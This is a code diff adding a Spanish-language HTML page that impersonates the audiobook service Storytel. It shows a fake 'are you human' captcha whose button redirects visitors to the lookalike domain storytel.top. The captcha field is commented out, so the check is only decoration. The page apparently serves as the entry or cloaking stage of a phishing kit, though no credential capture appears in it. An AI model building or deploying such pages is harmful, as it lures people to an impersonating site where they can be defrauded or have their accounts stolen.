@@ -1,0 +1,109 @@
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="Escuche los bestsellers desde su teléfono. Únete a nosotros hoy
+">
+  <title> Storytel - Bienvenido</title>
+  <link rel="shortcut icon" href="apple-touch-icon-18b42bddd9d5db513d46f7c22955c0c5.png" />
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" />
+  <link rel="stylesheet" href="https://getbootstrap.com/docs/4.5/examples/sign-in/signin.css" />
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+  <style>
+    .bd-placeholder-img {
+      font-size: 1.125rem;
+      text-anchor: middle;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
+
+    @media (min-width: 768px) {
+      .bd-placeholder-img-lg {
+        font-size: 3.5rem;
+      }
+    }
+  </style>
+</head>
+<body class="text-center">
+<form class="form-signin" onsubmit="return continueToWebsite()" id="captcha">
+  <img class="mb-4" src="apple-touch-icon-18b42bddd9d5db513d46f7c22955c0c5.png" alt="" width="72" height="72">
+  <h1 class="h3 mb-3 font-weight-normal">Eres humano?</h1>
+  
+  <!--
+  <input type="text" 
+     class="form-control" 
+     style="margin-bottom: 0px; width: 200px; height: 40px; font-size: 24px; font-weight: bolder; text-decoration: line-through; display: inline-block; background-color: rgb(178, 0, 255);" 
+     id="mainCaptcha"
+     disabled="">
+  <button class="btn btn-info" type="button" style="display: inline-block; margin-top: -0.65em;" id="refresh" onclick="Captcha();">Refresh</button>
+  <input type="text" id="txtInput" name="captcha" class="form-control mt-1" placeholder="Enter captcha" required autofocus>
+  -->
+  <button class="btn btn-lg btn-primary btn-block mt-1" type="submit">Continuar escuchando libros</button>
+  <!--
+  <div class="alert alert-warning d-none mt-3" role="alert" id="logContainer">
+    <span id="log"></span>
+  </div>
+  -->
+  <p class="mt-5 mb-3 text-muted">&copy; 2020</p>
+</form>
+
+  
+<script type="text/javascript">
+const redirectUri = 'https://storytel.top';
+
+function continueToWebsite() {
+  window.location = redirectUri;
+  return false;
+}
+function validateForm(){
+    $('#logContainer').addClass('d-none');
+    document.getElementById('log').innerHTML = '';
+
+    var string1 = removeSpaces(document.getElementById('mainCaptcha').value);
+    var string2 = removeSpaces(document.getElementById('txtInput').value);
+
+    if (string1 != string2 || string2 == "") {
+      Captcha();
+      $('#logContainer').removeClass('d-none');
+      document.getElementById('log').innerHTML += '<span style="font-size:16px; padding: 25px;">Entered Invalid Captcha</span> ';
+    } else {
+      window.location = redirectUri;
+    }
+  
+    return false;
+}
+  
+function Captcha(){
+    var alpha = new Array('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0');
+    var i;
+    for (i=0;i<6;i++){
+      var a = alpha[Math.floor(Math.random() * alpha.length)];
+      var b = alpha[Math.floor(Math.random() * alpha.length)];
+      var c = alpha[Math.floor(Math.random() * alpha.length)];
+      var d = alpha[Math.floor(Math.random() * alpha.length)];
+      var e = alpha[Math.floor(Math.random() * alpha.length)];
+      var f = alpha[Math.floor(Math.random() * alpha.length)];
+      var g = alpha[Math.floor(Math.random() * alpha.length)];
+    }
+    var code = a + ' ' + b + ' ' + ' ' + c + ' ' + d + ' ' + e + ' '+ f + ' ' + g;
+    document.getElementById("mainCaptcha").value = code;
+  
+    var colors = ["#B40404", "#beb1dd", "#b200ff", "#faff00", "#0000FF", "#FE2E9A", "#FF0080", "#2EFE2E", ];
+    var rand = Math.floor(Math.random() * colors.length);
+    
+    $('#mainCaptcha').css("background-color", colors[rand]);
+}
+  
+function removeSpaces(string){
+    return string.split(' ').join('');
+}
+  
+window.addEventListener('load', function() {
+  Captcha();
+});
+</script>
+
+</body>
+</html>
